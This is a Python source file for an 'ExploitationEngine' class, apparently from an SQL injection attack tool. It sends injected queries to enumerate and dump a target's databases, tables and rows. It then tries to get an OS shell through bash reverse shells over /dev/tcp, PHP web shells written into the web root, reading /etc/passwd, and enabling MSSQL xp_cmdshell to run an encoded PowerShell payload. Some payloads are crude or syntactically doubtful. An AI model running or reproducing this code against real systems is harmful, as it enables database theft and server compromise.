import logging
from typing import List, Dict, Any
from core.request_engine import RequestEngine
from core.payload_manager import PayloadManager

class ExploitationEngine:
    def __init__(self, request_engine: RequestEngine, payload_manager: PayloadManager):
        self.request_engine = request_engine
        self.payload_manager = payload_manager
        self.dbms = None
        self.current_db = None
        self.current_table = None
        
    def set_dbms(self, dbms: str):
        """Set the target DBMS."""
        self.dbms = dbms
        logging.info(f"Target DBMS set to: {dbms}")
        
    def dump_database(self) -> List[Dict[str, Any]]:
        """Dump the contents of the current database."""
        if not self.dbms:
            logging.error("DBMS not set. Use --dbms to specify the target database.")
            return []
            
        results = []
        try:
            # Get database version
            version = self._get_version()
            results.append({
                "type": "version",
                "data": version
            })
            
            # Get current database
            current_db = self._get_current_db()
            results.append({
                "type": "current_database",
                "data": current_db
            })
            
            # Get all databases
            databases = self._get_databases()
            results.append({
                "type": "databases",
                "data": databases
            })
            
            # Get tables from current database
            tables = self._get_tables()
            results.append({
                "type": "tables",
                "data": tables
            })
            
            # Get columns from current table
            if self.current_table:
                columns = self._get_columns()
                results.append({
                    "type": "columns",
                    "data": columns
                })
                
                # Dump table contents
                data = self._dump_table()
                results.append({
                    "type": "table_data",
                    "data": data
                })
                
        except Exception as e:
            logging.error(f"Error during database dump: {str(e)}")
            
        return results
        
    def get_os_shell(self) -> List[Dict[str, Any]]:
        """Attempt to get an OS shell."""
        results = []
        try:
            if self.dbms == "MySQL":
                shell = self._get_mysql_shell()
            elif self.dbms == "PostgreSQL":
                shell = self._get_postgres_shell()
            elif self.dbms == "MSSQL":
                shell = self._get_mssql_shell()
            else:
                logging.error(f"OS shell not supported for {self.dbms}")
                return results
                
            results.append({
                "type": "os_shell",
                "data": shell
            })
            
        except Exception as e:
            logging.error(f"Error getting OS shell: {str(e)}")
            
        return results
        
    def _get_version(self) -> str:
        """Get database version."""
        if self.dbms == "MySQL":
            payload = "SELECT VERSION()"
        elif self.dbms == "PostgreSQL":
            payload = "SELECT version()"
        elif self.dbms == "MSSQL":
            payload = "SELECT @@version"
        else:
            return "Unknown"
            
        response, _ = self.request_engine.send_request(payload=payload)
        return response.text
        
    def _get_current_db(self) -> str:
        """Get current database name."""
        if self.dbms == "MySQL":
            payload = "SELECT DATABASE()"
        elif self.dbms == "PostgreSQL":
            payload = "SELECT current_database()"
        elif self.dbms == "MSSQL":
            payload = "SELECT DB_NAME()"
        else:
            return "Unknown"
            
        response, _ = self.request_engine.send_request(payload=payload)
        return response.text
        
    def _get_databases(self) -> List[str]:
        """Get list of all databases."""
        if self.dbms == "MySQL":
            payload = "SELECT schema_name FROM information_schema.schemata"
        elif self.dbms == "PostgreSQL":
            payload = "SELECT datname FROM pg_database"
        elif self.dbms == "MSSQL":
            payload = "SELECT name FROM master.dbo.sysdatabases"
        else:
            return []
            
        response, _ = self.request_engine.send_request(payload=payload)
        return response.text.split('\n')
        
    def _get_tables(self) -> List[str]:
        """Get list of tables in current database."""
        if self.dbms == "MySQL":
            payload = "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()"
        elif self.dbms == "PostgreSQL":
            payload = "SELECT tablename FROM pg_tables WHERE schemaname='public'"
        elif self.dbms == "MSSQL":
            payload = "SELECT name FROM sysobjects WHERE xtype='U'"
        else:
            return []
            
        response, _ = self.request_engine.send_request(payload=payload)
        return response.text.split('\n')
        
    def _get_columns(self) -> List[str]:
        """Get list of columns in current table."""
        if not self.current_table:
            return []
            
        if self.dbms == "MySQL":
            payload = f"SELECT column_name FROM information_schema.columns WHERE table_name='{self.current_table}'"
        elif self.dbms == "PostgreSQL":
            payload = f"SELECT column_name FROM information_schema.columns WHERE table_name='{self.current_table}'"
        elif self.dbms == "MSSQL":
            payload = f"SELECT name FROM syscolumns WHERE id=OBJECT_ID('{self.current_table}')"
        else:
            return []
            
        response, _ = self.request_engine.send_request(payload=payload)
        return response.text.split('\n')
        
    def _dump_table(self) -> List[Dict[str, Any]]:
        """Dump contents of current table."""
        if not self.current_table:
            return []
            
        payload = f"SELECT * FROM {self.current_table}"
        response, _ = self.request_engine.send_request(payload=payload)
        return response.json() if response.headers.get('content-type') == 'application/json' else response.text.split('\n')
        
    def _get_mysql_shell(self) -> str:
        """Get OS shell using MySQL."""
        # Try various methods to get a shell
        methods = [
            "SELECT sys_exec('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')",
            "SELECT system('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')",
            "SELECT INTO OUTFILE '/var/www/html/shell.php' VALUES('<?php system($_GET[\"cmd\"]); ?>')"
        ]
        
        for method in methods:
            try:
                response, _ = self.request_engine.send_request(payload=method)
                if response.status_code == 200:
                    return f"Shell attempt successful using: {method}"
            except:
                continue
                
        return "Failed to get shell"
        
    def _get_postgres_shell(self) -> str:
        """Get OS shell using PostgreSQL."""
        methods = [
            "SELECT system('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')",
            "COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php'",
            "SELECT lo_import('/etc/passwd')"
        ]
        
        for method in methods:
            try:
                response, _ = self.request_engine.send_request(payload=method)
                if response.status_code == 200:
                    return f"Shell attempt successful using: {method}"
            except:
                continue
                
        return "Failed to get shell"
        
    def _get_mssql_shell(self) -> str:
        """Get OS shell using MSSQL."""
        methods = [
            "EXEC xp_cmdshell 'net user'",
            "EXEC master..xp_cmdshell 'powershell -enc <base64_encoded_payload>'",
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        ]
        
        for method in methods:
            try:
                response, _ = self.request_engine.send_request(payload=method)
                if response.status_code == 200:
                    return f"Shell attempt successful using: {method}"
            except:
                continue
                
        return "Failed to get shell" 
